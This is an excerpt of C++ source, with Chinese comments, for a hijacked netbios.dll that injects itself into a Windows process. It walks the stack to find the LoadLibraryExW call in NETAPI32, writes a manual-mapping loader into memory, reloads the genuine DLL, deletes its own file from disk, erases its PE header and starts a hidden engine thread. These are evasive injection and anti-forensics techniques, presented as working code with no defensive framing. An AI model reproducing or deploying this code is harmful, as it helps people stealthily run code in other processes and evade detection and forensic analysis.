...
//内存加载
bytes PrepareDllForManualMapping(const LPVOID hDLLData)
{
...
bytes GenerateManualDllLoaderFunction() {
...
void ReloadNetbiosAndInjectCurrentDll(HMODULE hModule, const bytes& dllData, LPVOID lpReserved) {
	void* aFnNetbios = (void*)GetModuleProcAddress("NETAPI32", "Netbios");
	DWORD_PTR hModuleNetapi32 = (DWORD_PTR)GetModuleHandleA("NETAPI32.dll");
	size_t netapi32ModuleSize = GetModuleSize((HMODULE)hModuleNetapi32);
	void* fnLoadLibraryExWRetAddress = nullptr;
	void* fnLoadLibraryExW = nullptr;
	void** ppReLoadNetBios = nullptr;
	/*获取挂接地址*/
	for (int i = 0; i < 0x1000; i++)
	{
		ppReLoadNetBios = (void**)(((DWORD_PTR)lpReserved) + i * 8);
		DWORD_PTR RetAddress = NULL;
		if (ReadProcessMemory(GetCurrentProcess(), ppReLoadNetBios, &RetAddress, sizeof(RetAddress), nullptr) == FALSE) {
			break;
		}
		if (RetAddress > hModuleNetapi32 && RetAddress < hModuleNetapi32 + netapi32ModuleSize) {
			if (*(unsigned short*)(RetAddress - 6) == 0x15ff) {
				DWORD_PTR iatLoadLibraryExW = RetAddress + *(int*)(RetAddress - 4);
				if (iatLoadLibraryExW > hModuleNetapi32 && iatLoadLibraryExW < hModuleNetapi32 + netapi32ModuleSize) {
					fnLoadLibraryExW = (void*)GetModuleProcAddress("KERNELBASE", "LoadLibraryExW");
					if (*(void**)iatLoadLibraryExW == fnLoadLibraryExW) {
						fnLoadLibraryExWRetAddress = (void*)RetAddress;
						break;
					}
				}
			}
	...
	if (ppReLoadNetBios && fnLoadLibraryExWRetAddress) {
		...
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x108) = fnLoadLibraryExWRetAddress;
		sprintf_s((char*)allocatedBaseAddress + 0x300, 0x100, GetModuleFileNameA(hModule).c_str());
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x110) = (void*)(DWORD_PTR(allocatedBaseAddress) + 0x300);
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x118) = (void*)GetModuleProcAddress("kernel32", "DeleteFileA");
		...
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x128) = (void*)(DWORD_PTR(allocatedBaseAddress) + 0x500);//写入加载函数
		sprintf_s((char*)(DWORD_PTR(allocatedBaseAddress) + 0x260), 0x100, "LOADER ERROR 0x01");
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x130) = (void*)(DWORD_PTR(allocatedBaseAddress) + 0x260);
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x138) = (void*)GetModuleProcAddress("user32.dll", "MessageBoxTimeoutA");
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x140) = (void*)ExitProcess;
		...
		//重载netbios
		*(void**)(DWORD_PTR(allocatedBaseAddress) + 0x200) = fnLoadLibraryExW;
		sprintf_s((char*)allocatedBaseAddress + 0x208, 0x18, "netbios.dll");
		//挂载数据 
		*ppReLoadNetBios = allocatedBaseAddress;
	}
	else
	{
		MessageBoxTimeoutA(nullptr, "LOADER ERROR 0x02");
...
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		/*重新加载原始模块*/
		if (GetModuleHandleA("netbios.dll") == hModule) {
			bytes dllData = ReadFile((GetModuleFileNameA(hModule)).c_str());
			ReloadNetbiosAndInjectCurrentDll(hModule, dllData, _AddressOfReturnAddress());
			memset(dllData.data(), 0, dllData.size());
			dllData.clear(); dllData.shrink_to_fit();
			return FALSE;
		}
		/*Dll劫持完成*/
		memset(hModule, 0, 0x1000);
		Kernel::_SafeCreateThread(WAITORTIMERCALLBACK(Engine::Intialize), hModule);
	}
	return TRUE;
}